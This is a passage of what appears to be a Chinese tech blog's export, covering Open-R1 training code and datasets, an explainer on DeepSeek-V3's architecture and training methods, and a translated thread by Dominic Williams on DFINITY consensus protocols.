<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># send requests in batches of 500</span></span><br><span class="line"><span class="keyword">for</span> batch <span class="keyword">in</span> batch_generator(dataset, bs=<span class="number">500</span>):</span><br><span class="line">    active_tasks = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> batch:</span><br><span class="line">        task = asyncio.create_task(send_requests(row))</span><br><span class="line">        active_tasks.add(task)</span><br><span class="line">    <span class="keyword">if</span> active_tasks:</span><br><span class="line">        <span class="keyword">await</span> asyncio.gather(*active_tasks)</span><br></pre></td></tr></table></figure>
<p>  流式请求的新版代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">active_tasks = []</span><br><span class="line"><span class="keyword">for</span> row <span class="keyword">in</span> dataset:</span><br><span class="line">    <span class="comment"># keep the total active requests under 500</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(active_tasks) &gt;= <span class="number">500</span>:</span><br><span class="line">        done, active_tasks = <span class="keyword">await</span> asyncio.wait(</span><br><span class="line">            active_tasks,</span><br><span class="line">            return_when=asyncio.FIRST_COMPLETED</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    task = asyncio.create_task(send_requests(row))</span><br><span class="line">    active_tasks.add(task)</span><br><span class="line"></span><br><span class="line"><span class="comment"># wait for all remaining tasks to complete</span></span><br><span class="line"><span class="keyword">if</span> active_tasks:</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*active_tasks)</span><br><span class="line">    <span class="comment"># Open R1当前的生成速率已趋于稳定，但对于长查询被抢占时是否采用CPU 缓存策略仍需进一步探索。</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>实施监督微调训练代码，<code>sft.py</code>: performs a simple SFT of a model on a dataset.</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> Train via <span class="built_in">command</span> line</span></span><br><span class="line">accelerate launch --config_file=recipes/accelerate_configs/zero3.yaml src/open_r1/sft.py \</span><br><span class="line">    --model_name_or_path Qwen/Qwen2.5-1.5B-Instruct \</span><br><span class="line">    --dataset_name HuggingFaceH4/Bespoke-Stratos-17k \</span><br><span class="line">    --learning_rate 2.0e-5 \</span><br><span class="line">    --num_train_epochs 1 \</span><br><span class="line">    --packing \</span><br><span class="line">    --max_seq_length 4096 \</span><br><span class="line">    --per_device_train_batch_size 2 \</span><br><span class="line">    --gradient_accumulation_steps 8 \</span><br><span class="line">    --gradient_checkpointing \</span><br><span class="line">    --bf16 \</span><br><span class="line">    --output_dir data/Qwen2.5-1.5B-Open-R1-Distill</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> Train via YAML config</span></span><br><span class="line">accelerate launch --config_file recipes/accelerate_configs/zero3.yaml src/openr1/sft.py \</span><br><span class="line">    recipes/Qwen/Qwen2.5-1.5B-Instruct/sft/config_demo.yaml</span><br></pre></td></tr></table></figure></li>
<li><p>训练和评估代码，<code>evaluate.py</code>: evaluates a model on the R1 benchmarks.</p>
</li>
</ul>
<h2 id="数据集"><a href="#数据集" class="headerlink" title="数据集"></a>数据集</h2><p>社区在多个与R1相关的数据集项目上非常活跃，以下是一些亮点：</p>
<ul>
<li><a href="https://huggingface.co/datasets/bespokelabs/Bespoke-Stratos-17k">bespokelabs/Bespoke-Stratos-17k</a>：这是对 Berkeley Sky-T1 数据管线的复制，使用 DeepSeek-R1 创建一个包含问题、推理轨迹和答案的数据集。随后，这些数据被用于通过类似于 R1 论文中的蒸馏方法，微调 7B 和 32B 的 Qwen 模型。</li>
<li><a href="https://huggingface.co/datasets/open-thoughts/OpenThoughts-114k">open-thoughts/OpenThoughts-114k</a>：一个“开放的合成推理数据集，包含 114k 个高质量样本，涵盖数学、科学、代码和谜题”。这是 Open Thoughts 项目的一部分。</li>
<li><a href="https://huggingface.co/datasets/cognitivecomputations/dolphin-r1">cognitivecomputations/dolphin-r1</a>：一个包含 80 万样本的数据集，样本来自 DeepSeek-R1、Gemini flash 以及来自 DolphinChat 的 20 万样本，目的是帮助训练 R1 风格的模型。</li>
<li><a href="https://huggingface.co/datasets/ServiceNow-AI/R1-Distill-SFT">ServiceNow-AI/R1-Distill-SFT</a>：目前有 17,000 个样本，这是 ServiceNow 语言模型实验室为支持 Open-R1 工作而创建的数据集。</li>
<li><a href="https://huggingface.co/datasets/NovaSky-AI/Sky-T1_data_17k">NovaSky-AI/Sky-T1_data_17k</a>：用于训练 Sky-T1-32B-Preview 的 17k 训练数据。最终数据包含来自 APPs 和 TACO 的 5k 编码数据，以及来自 NuminaMATH 数据集的 AIME、MATH 和 Olympiads 子集的 10k 数学数据。此外，我们还维护了来自 STILL-2 的 1k 科学和拼图数据。使用该数据集训练的模型成本不到 450 美元。</li>
<li><a href="https://huggingface.co/datasets/Magpie-Align/Magpie-Reasoning-V2-250K-CoT-Deepseek-R1-Llama-70B">Magpie-Align/Magpie-Reasoning-V2-250K-CoT-Deepseek-R1-Llama-70B</a>：这个数据集扩展了 <a href="https://huggingface.co/papers/2406.08464">Magpie</a> 和方法，通过生成没有起始提示的指令数据来包括推理过程。指令由 Llama 3.1 70B Instruct 和 Llama 3.3 70B Instruct 生成，响应则由 DeepSeek-R1-Distill-Llama-70B 生成。</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>SFT后，进步显著，怎么做到的？<br> 一是微调用的训练数据起到了一定作用；二是强制让模型延长思考时间（test time scaling），具体做法叫做（Budget Forcing）预算强制，也就是强制限制模型使用最大或最小 tokens 进行推理，以此控制模型的思考长度。<br> 为了尽可能延长模型的思考，他们将模型的思考放在标签内，当结束后，以 final answer 给出答案，同时，当 LLM 即将停止思考时，会强制输出 Wait 来迫使模型继续思考，通过这样的方式，模型会进入反思，并可能会发现自己的错误。<br> 推理时插入的“Wait”，也许会像当初的 Step by Step 一样，成为一个魔法 token。“这或许就是古人‘三思而后行’的哲学吧！”</li>
<li>R1 训练的步骤总结：<br> 1）精心选择若干条（如 8000 条）高质量的数据，<br> 2）通过让 Gemini/DeepSeek V3 补充完善思维链COT之后作为数据集，<br> 3）以开源的大模型（如 Qwen2.5-32B，Llama 3.1）为基座微调出结果(如 R1)。<br> 4）最后，在模型输出时，用（Budget Forcing）预算强制方法强行拉长模型的思考时长和输出 token，结果发现其在特定测试集上进步显著。</li>
</ol>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>DeepSeek</tag>
      </tags>
  </entry>
  <entry>
    <title>DeepSeek的核心技术</title>
    <url>/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/</url>
    <content><![CDATA[<h2 id="一、关于DeepSeek公司及其大模型"><a href="#一、关于DeepSeek公司及其大模型" class="headerlink" title="一、关于DeepSeek公司及其大模型"></a>一、关于DeepSeek公司及其大模型</h2><h3 id="1-1-公司概况"><a href="#1-1-公司概况" class="headerlink" title="1.1 公司概况"></a>1.1 公司概况</h3><p>DeepSeek 2023年7月成立于杭州，是幻方量化旗下的子公司，全称是杭州深度求索人工智能基础技术研究有限公司。”成立时间才一年多”、”最近推出的V3已经能和OpenAI的4o媲美”、”训练成本不到600W美元”、”API定价仅是国内其他头部厂商几十分之一”、”APP已经在中美APP store登上免费应用榜首”；</p>
<p>以上是最近关于DeepSeek的一些新闻热点信息，下面我们从官网看下：<br>DeepSeek近半年相继推出了3个主要的大模型版本，分别是DeepSeek V2.5、DeepSeek V3、DeepSeek-R1（无一例外的都是用了MOE架构）。在这之前还推出了DeepSeek-VL、DeepSeek Coder、DeepSeek Math。<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/1.jpg"></p>
<h3 id="1-2-模型能力"><a href="#1-2-模型能力" class="headerlink" title="1.2 模型能力"></a>1.2 模型能力</h3><p>DeepSeek模型已经对标国内Qwen、海外Llama、GPT 4o，从公布的榜单评测上看：DeepSeek-V3 在开源模型中位列榜首，与世界上最先进的闭源模型不分伯仲。<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/2.jpg"></p>
<p><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/3.jpg"></p>
<h3 id="1-3训推成本"><a href="#1-3训推成本" class="headerlink" title="1.3训推成本"></a>1.3训推成本</h3><p>推理成本(API报价)：百万Token输入价格能达到1元。<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/4.jpg"><br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/5.jpg"><br>训练成本：从技术报告中看DeepSeek用的是H800的GPU做的训练，而且只有2千张左右的H800，整个V3的正式训练成本不超过600W美元。</p>
<blockquote>
<p>1、预训练阶段，每万亿的Token 训练V3使用 2048 个H800GPU集群，只需要 180K 个H800 GPU小时，大概 3.7 天(180000/2048/24)<br>2、整个预训练总耗时 2664K GPU小时（不到2个月），加上 上下文扩展和后训练，总耗时大概2788KGPU耗时。<br>3、按照 H800 每小时2美元租赁，总的训练成本不超过600W美元<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/6.jpg"></p>
</blockquote>
<p>这么低的推理和训练成本不由引出以下的问题：</p>
<ul>
<li>模型采用了什么样的网络架构？</li>
<li>训练的精度、框架和并行策略是怎样的？</li>
<li>模型的部署和优化方案是怎样的？</li>
<li>在硬件层的计算和通信上做了什么优化？</li>
</ul>
<h2 id="二、DeepSeek训推核心技术"><a href="#二、DeepSeek训推核心技术" class="headerlink" title="二、DeepSeek训推核心技术"></a>二、DeepSeek训推核心技术</h2><h3 id="2-1-DeepSeek-V3模型网络架构"><a href="#2-1-DeepSeek-V3模型网络架构" class="headerlink" title="2.1 DeepSeek-V3模型网络架构"></a>2.1 DeepSeek-V3模型网络架构</h3><p><strong>1) DeepSeekV3 整体预训练用了14.8万亿的高质量Token，2) 并且在后期做了SFT和RL，模型参数量达到 671B，但是每个Token仅激活37B参数。为了做到高效的推理和训练，3) DeepSeekV3自研了MLA注意力机制和无辅助损失负载均衡策略的MoE架构。</strong></p>
<p>从技术报告中看出，是经典的Transformer架构，比较亮眼的就是前馈网络使用的DeepSeekMoE架构、Attention机制使用MLA架构，其实这两个在DeepSeekV2模型已经被验证使用过。<br>与DeepSeek-V2相比，V3额外引入了一种<strong>无辅助损失的负载均衡策略</strong>，用于DeepSeekMoE，以减轻因需要保证Expert负载均衡而导致的性能下降。<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/7.jpg"></p>
<h4 id="2-1-1-DeepSeekMoE"><a href="#2-1-1-DeepSeekMoE" class="headerlink" title="2.1.1 DeepSeekMoE"></a>2.1.1 DeepSeekMoE</h4><p>第一个将MoE架构引入Transformer网络的就是GShard架构了，与传统大模型架构相比，MoE架构在数据流转过程中集成了一个专家网络层。<br>可以看出传统的MoE基本两部分组成：Gating门控网络、稀疏MoE层；</p>
<blockquote>
<ul>
<li>稀疏 MoE 层: 这些层代替了传统 Transformer 模型中的前馈网络 (FFN) 层。MoE 层包含若干“专家”(例如 8 个)，每个专家本身是一个独立的神经网络。在实际应用中，这些专家通常是前馈网络 (FFN)，但它们也可以是更复杂的网络结构，甚至可以是 MoE 层本身，从而形成层级式的 MoE 结构。</li>
<li>门控网络或路由: 这个部分用于决定哪些Token被发送到哪个专家。Token的路由方式是 MoE 使用中的一个关键点，因为路由器由学习的参数组成，并且与网络的其他部分一同进行预训练。</li>
</ul>
</blockquote>
<p><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/8.jpg"><br>和传统的MoE架构相比，<strong>DeepSeekMoE使用更细粒度的专家，并将一些专家隔离为共享专家，减少专家间的知识冗余</strong>。<br>﻿<img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/9.jpg"></p>
<p><strong>门控网络路由策略</strong>：TopK表示第t个Token和所有路由专家计算出的亲和力分数中K个最高分数的集合，在DeepSeekV3中，使用sigmoid函数计算亲和力分数，然后在所有选择的亲和力分数中应用归一化来生成门控值。﻿<br>通常在MoE模型的训练过程中，不同专家因为路由策略的因素会导致接收的训练数据分布不均，比如所有的Token都被发送到只有少数几个受欢迎的专家，那么有些专家就可能没有被训练到。<br>业界通用的解决方案就是引入辅助损失，但是，有时候过大的辅助损失会损害模型性能。<br>为了在负载均衡和模型性能之间取得更好的平衡，DeepSeek开创了一种<strong>无辅助损失的负载均衡策略</strong>：为每个专家引入一个偏差项 bi，并将其添加到相应的亲和力分数 Si,t 中以确定top-K路由，具体来说：如果其对应的专家过载，我们将偏差项减少γ；如果其对应的专家负载不足，我们将偏差项增加γ，其中γ是一个称为偏差更新速度的超参数。</p>
<blockquote>
<p>门控网络本质上就是一个softmax叠加一个分类网络，那么辅助loss往往就是添加一个惩罚项，对输出过大的 logits 进行惩罚，鼓励模型生成更加适度的 logits 值，防止模型生成过于极端的输出。</p>
</blockquote>
<h4 id="2-1-2-MLA-多头潜在注意力"><a href="#2-1-2-MLA-多头潜在注意力" class="headerlink" title="2.1.2 MLA 多头潜在注意力"></a>2.1.2 MLA 多头潜在注意力</h4><p>﻿大模型推理过程KV Cache机制一般是限制推理效率的一大瓶颈，而标准的Transformer 架构里面的MHA架构会产出非常多的KV Cache，为了减少对应的KV Cache业界实践过很多方案，例如PagedAttention、多查询注意力（MQA）和分组查询注意力（GQA），但是性能相比原生的MHA有一定差距。﻿<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/10.jpg"><br>DeepSeek-V2，提出一种创新的注意力机制：多头潜在注意力（MLA）。<br>相比MQA的KV共用和GQA的KV分组，<strong>MLA的核心是注意力键和值的低秩联合压缩，以减少推理过程中的键值(KV)缓存</strong>。相比MHA具有更好的性能，但需要的 KV 缓存量要少得多。﻿<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/11.jpg"></p>
<blockquote>
<p>低秩矩阵是指其秩（rank）远小于其行数和列数的矩阵。<br>假设我们有一个矩阵，其实际结构允许它被分解为两个较小的矩阵的乘积。这种情况通常意味着原矩阵是低秩的。<br>假设我们有一个<code>4×5</code>的矩阵<code>A</code>，这个矩阵可以通过两个更小的矩阵的乘积来表示，比如一个<code>4×2</code>的矩阵<code>B</code>和一个<code>2×5</code>的矩阵<code>C</code>。这意味着原始矩阵<code>A</code>的信息可以通过这两个较小的矩阵来捕捉，表明<code>A</code>是一个低秩矩阵。</p>
</blockquote>
<p>低秩压缩计算核心过程：<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/12.jpg"><br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/13.jpg"><br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/14.jpg"><br>这里的 ht 表示第 t 个Token的输入，WDKV 表示KV的向下投影矩阵，将 ht 做降维压缩表示，实际得到 cKVt 就是要缓存的KV压缩隐向量；WUK和WUV是向上做升维的投影矩阵，将Token的压缩隐向量cKVt复原为原始KV矩阵；<br>MLA 模块架构图如下：<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/15.jpg"></p>
<h3 id="2-2-训练推理核心技术"><a href="#2-2-训练推理核心技术" class="headerlink" title="2.2 训练推理核心技术"></a>2.2 训练推理核心技术</h3><p><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/16.jpg"></p>
<h4 id="2-2-1-训练框架HAI-LLM"><a href="#2-2-1-训练框架HAI-LLM" class="headerlink" title="2.2.1 训练框架HAI-LLM﻿"></a>2.2.1 训练框架HAI-LLM﻿</h4><p>DeepSeek-V3在一个配备了2048个NVIDIA H800 GPU的集群上进行训练，使用的是自研的HAI-LLM框架，框架实现了四种并行训练方式：<strong>ZeRO 支持的数据并行、流水线并行、张量切片模型并行和序列并行</strong>。  <br>这种并行能力支持不同工作负载的需求，可以支持数万亿规模的超大模型并扩展到数千个 GPU，同时还自研了一些配套的高性能算子haiscale，可以帮助 HAI-LLM 极大优化大模型训练的显存效率和计算效率。</p>
<h4 id="2-2-2-核心算法DualPipe-创新流水线并行算法"><a href="#2-2-2-核心算法DualPipe-创新流水线并行算法" class="headerlink" title="2.2.2 核心算法DualPipe-创新流水线并行算法"></a>2.2.2 核心算法DualPipe-创新流水线并行算法</h4><p>i.通信计算重叠优化<br>DeepSeek-V3应用了16路流水线并行（PP），跨越8个节点的64路专家并行（EP），以及ZeRO-1数据并行（DP）。<br>与现有的流水线并行方法相比，<strong>DualPipe的流水线气泡更少</strong>。同时<strong>重叠了前向和后向过程中的计算和通信阶段，解决了跨节点专家并行引入的沉重通信开销的挑战</strong>。<br>DualPipe的关键思想是<strong>重叠一对单独的前向和后向块中的计算和通信</strong>：将每个块划分为四个组件：注意力、all-all调度、MLP和all-all组合</p>
<blockquote>
<p>例如，假设我们有两个计算块，A和B：<br>1.在块A进行前向传播计算时，可以同时进行块B的后向传播通信过程。<br>2.当块A完成前向传播计算后，开始它的通信过程；而块B则开始它的前向传播计算。</p>
</blockquote>
<p><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/17.jpg"><br>通过优化排列这些功能模块，并精确调控用于通信和计算的 GPU SM资源分配比例，系统能够在运行过程中有效隐藏全节点通信和 PP 通信开销。<br>可以看出DeepSeek在PP这块，做了大量的通信计算重叠优化，从技术报告中看出，即使是细粒度的all-all专家通信，all-all的通信开销几乎为0。<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/18.jpg">
﻿</p>
<blockquote>
<ul>
<li>计算通信重叠<br>在深度学习大规模分布式训练过程中，通信的速度往往落后于计算的速度，如何在通信的gap期间内并行做一些计算就是高性能计算和通信重叠，是实现高效训练的关键因素。</li>
<li>流水线并行气泡问题<br>一些大的模型会采用流水线并行策略，将模型的不同层放在不同的GPU上，但是不同层之间有依赖关系，后面层需要等前面的计算完才能开始计算，会导致GPU在一段时间是闲置的，如下图所示：<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/19.jpg"></li>
</ul>
</blockquote>
<p>ii.跨节点全对全通信<br>DeepSeek还专门定制了高效的跨节点all-all通信内核(包括调度和组合)。<br>具体来说：跨节点 GPU 通过 IB 完全互连，节点内通信通过 NVLink 处理，每个Token最多调度到 4个节点，从而减少 IB 通信量。同时<strong>使用warp专业化技术做调度和组合的优化</strong>。</p>
<blockquote>
<p>在调度过程中，(1) IB 发送，(2) IB 到 NVLink 转发，以及 (3) NVLink 接收分别由各自的 warp 处理。分配给每个通信任务的 warp 数会根据所有 SM 上的实际工作负载动态调整。<br>在合并过程中，(1) NVLink 发送，(2) NVLink 到 IB 的转发和累积，以及 (3) IB 接收和累积也由动态调整的 warp 处理。</p>
</blockquote>
<p>通过这种方式，IB 和 NVLink 的通信实现完全重叠，每个 token 能够在不产生 NVLink 额外开销的情况下，在每个节点上平均高效选择 3.2 个专家。这意味着，虽然 DeepSeek-V3 实际只选择 8 个路由专家，但它可以将这个数字扩展到最多 13 个专家（4 个节点 × 3.2 个专家/节点），同时保持相同的通信成本。</p>
<blockquote>
<p>DSV3采用了1个共享专家和256个路由专家的MoE架构，每个token会激活8个路由专家。</p>
</blockquote>
<h4 id="2-2-3-用于FP8训练的混合精度框架"><a href="#2-2-3-用于FP8训练的混合精度框架" class="headerlink" title="2.2.3 用于FP8训练的混合精度框架"></a>2.2.3 用于FP8训练的混合精度框架</h4><p>这里并没有将全量参数FP8量化训练，大多数计算密集型操作都在FP8中进行，而一些关键操作则战略性地保留其原始数据格式，以平衡训练效率和数值稳定性。</p>
<p><strong>哪些算子启用FP8量化去计算？取舍逻辑是什么？</strong></p>
<ul>
<li>大多数核心计算过程，即 GEMM 运算，都以 FP8 精度实现</li>
<li>涉及对低精度计算的敏感性的算子，仍然需要更高的精度</li>
<li>一些低成本算子也可以使用更高的精度<br>以下组件保留了原始精度（例如，BF16 或 FP32）：Embedding模块、输出头、MoE 门控模块、Normalization 算子以及 Attention 算子。</li>
</ul>
<p><strong>如何提高低精度训练精度？</strong></p>
<ul>
<li>细粒度量化<blockquote>
<p>对激活，在token维度采用group-wise的量化(1<em>128)；对权重，采用128</em> 128的block-wise量化<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/20.jpg"></p>
</blockquote>
</li>
<li>提高累加精度<blockquote>
<p>在 TensorCore 上执行矩阵 MMA（矩阵乘法累加）操作时，每当累加达到一个间隔时，这些部分结果会被传输到 CUDA Cores 上的 FP32 寄存器中，并在那里进行FP32 精度的累加计算。<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/21.jpg"></p>
</blockquote>
</li>
</ul>
<h4 id="2-2-4-MTP的训练目标"><a href="#2-2-4-MTP的训练目标" class="headerlink" title="2.2.4 MTP的训练目标"></a>2.2.4 MTP的训练目标</h4><p>DeepSeekV3训练过程设置了多Token预测的目标，从技术报告的消融实验看出，确实提高了模型在大多数评估基准上的性能，而且MTP模块还可以用于推理加速。<br><img src="/2025/02/07/DeepSeek%E7%9A%84%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF/22.jpg"></p>
<h4 id="2-2-5-推理部署方案"><a href="#2-2-5-推理部署方案" class="headerlink" title="2.2.5 推理部署方案"></a>2.2.5 推理部署方案</h4><p>DeepSeek-V3 整体参数量达到了671B，如此多的参数量，我们看下他的一个部署方案：<br><strong>推理部署采用了预填充(Prefilling)和解码(Decoding)分离的策略</strong>，确保了在线服务的高吞吐量和低延迟。通过冗余专家部署和动态路由策略，模型在推理时保持了高效的负载均衡。<br>整套部署方案下来基本是跨机分布式推理。</p>
<p>2.2.5.1 Prefill 阶段<br>这个阶段简单说就是并行处理用户的Prompt，将其转为KV Cache。</p>
<blockquote>
<p>预填充阶段的最小部署单元由4个节点组成，每个节点配备32个GPU。注意力部分采用4路张量并行（TP4）和序列并行（SP），并结合8路数据并行（DP8）。其较小的TP规模（4路）限制了TP通信的开销。对于MoE部分，我们使用32路专家并行（EP32）</p>
</blockquote>
<p>2.2.5.2 Decoder 阶段<br>这个阶段就是做自回归的每个Token的输出。</p>
<blockquote>
<p>解码阶段的最小部署单元由40个节点和320个GPU组成。注意力部分采用TP4和SP，结合DP80，而MoE部分使用EP320。对于MoE部分，每个GPU只承载一个专家，64个GPU负责承载冗余专家和共享专家﻿</p>
</blockquote>
<h2 id="总结：为什么DeepSeekV3训练成本这么低？"><a href="#总结：为什么DeepSeekV3训练成本这么低？" class="headerlink" title="总结：为什么DeepSeekV3训练成本这么低？"></a>总结：为什么DeepSeekV3训练成本这么低？</h2><p><strong>训练成本主要由模型架构以及训练架构所决定，而且两者一定是相辅相成。从报告中可以看出以下几个原因：</strong><br>I.<strong>MLA 机制</strong>：通过对KV做联合低秩压缩大幅减少KV Cache，相比业界从KV数量角度做KV Cache的减少，MLA 的压缩实现很考验研究团队的基本功。<br>II.<strong>FP8 训练</strong>：通过低精度计算减少了 GPU 内存使用和计算开销，技术报告中也提到FP8混合精度训练框架是首次在一个极大规模的模型上验证了其有效性，这一点也看出DeepSeek的Infra工程团队的底蕴。<br>III.<strong>MoE 架构</strong>：通过MoE稀疏激活机制大幅减少了计算量，相比Qwen和Llama的Dense架构有很大的训推先天优势，不过难题(专家的负载、通信、路由)也给到了Infra工程团队。</p>
<h2 id="三、为什么是DeepSeek？"><a href="#三、为什么是DeepSeek？" class="headerlink" title="三、为什么是DeepSeek？"></a>三、为什么是DeepSeek？</h2><p>在硅谷，类似DeepSeek这样的AI创新并不少有，只是这次是一家中国公司做出了这个动作，相比传统的‘美国创新、中国应用’的模式显得格外的让人兴奋。</p>
<p>从最近的一些访谈以及DeepSeek的技术报告中也能看出以下几点：<br>1、大模型是一个知识密集型产业，如何组织高密度人才？显然DeepSeek做到了。<br>2、大模型技术没有魔法，更多时候就是考验基本功和驱动力。<br>3、不以商业化为第一要义，很多时候能轻装上阵。</p>
<h2 id="四、个人思考"><a href="#四、个人思考" class="headerlink" title="四、个人思考"></a>四、个人思考</h2><p>1、长远来看，后续可能会有专门的适配Transformer架构的芯片，就像为卷积设计了ASIC芯片。<br>2、多Token预测、MoE架构可能很长一段时间都是大模型训推架构热门研究方向。<br>3、在国内做AI，应用始终会比基础研究有市场，更有话语权，但是基础创新和海外的代际差距会越来越小。<br>4、大模型训练和推理，软硬件是一个协同的生态，DeepSeek的出现将会促进AI全行业的更加快速且低成本的迭代。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>1、<a href="https://arxiv.org/abs/2404.19737">Better &amp; Faster Large Language Models via Multi-token Prediction﻿</a><br>4、<a href="https://arxiv.org/pdf/2412.19437">DeepSeek-V3 Technical Report</a>﻿<br>5、<a href="https://arxiv.org/pdf/2405.04434">DeepSeek-V2: A Strong, Economical, and Efficient Mixture-of-Experts Language Model</a>﻿<br>6、<a href="https://www.zhihu.com/question/8423473404">deepseek v3的成本这么低的根本原因是什么？</a>﻿<br>7、<a href="https://arxiv.org/pdf/1811.06965">GPipe: Easy Scaling with Micro-Batch Pipeline Parallelism</a> ﻿</p>
]]></content>
      <tags>
        <tag>AI</tag>
        <tag>DeepSeek</tag>
      </tags>
  </entry>
  <entry>
    <title>Dominic Williams talking about DFINITY consensus</title>
    <url>/2018/04/16/Dominic-Williams-talking-about-DFINITY-consensus/</url>
    <content><![CDATA[<p>摘自<br><a href="https://twitter.com/dominic_w/status/932047902905634816">https://twitter.com/dominic_w/status/932047902905634816</a></p>
<p>Dominic Williams 18 Nov 2017 DFINITY</p>
<p>I spent much of 2014 repurposing BFT (Byzantine Fault Tolerant) consensus protocols from traditional distributed computing for the decentralized setting. My aim was to make faster blockchains.</p>
<p>2014年，Dominic Williams 花了很多时间将传统分布式计算的BFT（拜占庭容错）共识协议重新用于分布式环境。目标是制作更快的区块链。</p>
<p>Such consensus protocols proceed through rounds of message passing and “decide” on an output value, providing instant consistency rather than converging on a value like a traditional blockchain</p>
<p>这种共识协议通过消息传递和”决定”产生输出值，提供即时的一致性，而不是像传统区块链一样收敛。</p>
<p>The protocols come in three main flavors: Synchronous, Partially Synchronous and Asynchronous consensus. The first two flavors make assumptions about how fast participants in the protocol can exchange messages over the network.</p>
<p>（共识）协议有三种主要形式：同步，部分同步和异步共识。前两种形式假设协议的参与者可以通过网络交换消息的速度非常快。</p>
<p>When network asynchrony is sufficiently high - e.g. when a DDoS attack slows down message passing - Synchronous protocols become unsafe and fail to output a value, and Partially Synchronous protocols remain safe but also fail to output a value.</p>
<p>当网络异步性足够高的时候 - 例如当DDoS攻击减缓了消息的传递时 - 同步协议变得不安全且无法输出值，此时，部分同步协议仍然是安全的，但也无法输出值。</p>
<p>Currently both Cosmos and Algorand involve Partially Synchronous consensus protocols and thus are vulnerable to “DDoS Flatline” attacks that could cause them to output null blocks.</p>
<p>目前，Cosmos和Algorand都涉及部分同步共识协议，因此容易受到”DDoS”攻击，可能导致它们输出空块。</p>
<p>During 2014 I worked exclusively on repurposing leader-free Asynchronous consensus protocols that don’t make timing assumptions and thus aren’t vulnerable to DDoS Flatline attacks. These are slower but provide a better fit for the decentralized setting.</p>
<p>2014年，我专门致力于重新调整无领导人的异步共识协议，这些协议不做时序假设，因此不易受到DDos攻击。这会使速度变慢，但更适合分布式环境。</p>
<p>Asynchronous consensus protocols are necessarily probabilistic in nature. To drive participants to a decision on an output, they must produce random numbers and use them to direct message passing.</p>
<p>异步共识协议本质上是概率性的。为了促使参与者对输出做出决定，他们必须产生随机数并使用它们指导消息传递。</p>
<p>The first Asynchronous consensus protocol that generated random numbers using cryptography in a practical way was described in 2000 by Cachin, Klaus &amp; Shoup <a href="http://gridsec.org/docs/abba.pdf">http://gridsec.org/docs/abba.pdf</a> </p>
<p>使用加密技术，以工程方式生成随机数的第一个异步共识协议是在2000年由Cachin，Klaus＆Shoup发布的。 [<a href="http://gridsec.org/docs/abba.pdf]">http://gridsec.org/docs/abba.pdf]</a>(<a href="http://gridsec.org/">http://gridsec.org</a> /docs/abba.pdf）</p>
<p>Unfortunately, the RSA threshold signature scheme they used to generate random numbers doesn’t have a companion distributed key generation (DKG) protocol and, depending on a trusted dealer, is unsuitable for decentralized networks.</p>
<p>不幸的是，他们用来生成随机数的RSA门限签名方案没有配套的分布式密钥生成（DKG）协议，并且必须依赖可信的分发人，所以不适合分布式网络。</p>
<p>In early 2014 I found a “unique deterministic” threshold signature scheme with a DKG <a href="https://hal.inria.fr/hal-00983149/document">https://hal.inria.fr/hal-00983149/document</a> &amp; was constructing new protocols derived from <a href="https://hal.archives-ouvertes.fr/hal-01176110/document">https://hal.archives-ouvertes.fr/hal-01176110/document</a></p>
